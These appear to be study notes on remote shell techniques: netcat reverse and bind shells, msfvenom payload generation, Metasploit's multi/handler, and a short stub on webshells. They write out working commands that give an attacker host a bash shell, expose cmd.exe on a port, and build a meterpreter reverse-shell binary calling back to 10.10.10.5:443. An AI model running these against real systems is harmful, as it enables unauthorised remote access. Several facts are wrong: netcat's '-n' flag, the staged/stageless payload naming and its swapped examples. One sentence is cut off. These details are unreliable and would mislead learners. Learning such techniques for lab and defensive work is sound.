#### Remote system interaction
* `reverse` shell - when we force the remote server to connect to our server.
	* the listener runs on the attacker's machine
	* the target connects to the attacker's machine with a shell
	* the attacker doesn't need to know the victim's IP
* `bind` shell - when we force remote server to open up a port which we can connect to in order to execute further commands. 
	* the listener on the server computer
	* the attacker need to know the IP address of the victim
	


### Tools
- Netcat
- Socat
- Metasploit - multi/handler
- Msfvenom

### simulating Reverse vs Bind shell
#### Reverse shell
Start listening on the attacker side
```zsh
sudo nc -lvnp <port>
```

Initiating connection from target side
```zsh
nc <attacker-ip> <port> -e /bin/bash
```

> the `-e` flag, which stands for `execute` instructs `nc` to execute the command that follows it after establishing a connection.

#### Bind shell
On the target machine (assume we're on the window machine - that's why we included `cmd.exe` file instead)
```zsh
nc -lvnp <port> -e "cmd.exe"
```

Connect to that service form the attacker `pc`
```zsh
nc <targets-ip> <port>
```


### Netcat
Time to explain the `-lvnp` thing
 - l - listening
 - v - verbose
 - n - host name resolution, `DNS`
 - p - port specification

### msfvenome
- used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal `shellcode` when developing something like a Buffer Overflow exploit.
syntax:
```zsh
msfvenom -p <PAYLOAD> <OPTIONS>
```

#### Staged vs Stageless
- _**Staged**_ payloads are sent in two parts. The first part is called the _stager_. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts -- a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener -- usually 
    
- _**Stageless**_ payloads are more common -- these are what we've been using up until now. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

#### payload naming convention 
```
<os>/<arch>/<payload>
```

- __ is used for ``stageless`` payloads. `windows/shell/bind_hidden_tcp`
- / is used for staged ones. ` windows/shell_hidden_bind_tcp `

> to list all available payloads we can use this `msfvenom --list payloads`

Example:
>  to generate a staged meterpreter reverse shell for a 64bit Linux target, assuming your own IP was 10.10.10.5, and you were listening on port 443? The format for the shell is `elf` and the output filename should be `shell`
>  we use the following command ...

```zsh
msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell.elf LHOST=10.10.10.5 LPORT=443
```

### Metasploit multi/handler
- tool for catching reverse shells. 
*how to use?*
1. open metasploit `msfconsole`
2. type `use multi/handler` and press enter
3. `set PAYLOAD <payload>
4. `set LHOST <listen-address>`
5. `set LPORT <listen-port>`
6. `exploit -j`

### webshells
- a script that runs inside a webserver, which executes code on the server.
- after uploading vulnerability, we can execute that file directly on the server with the command of our desire in the `url`
>[!Demo] 

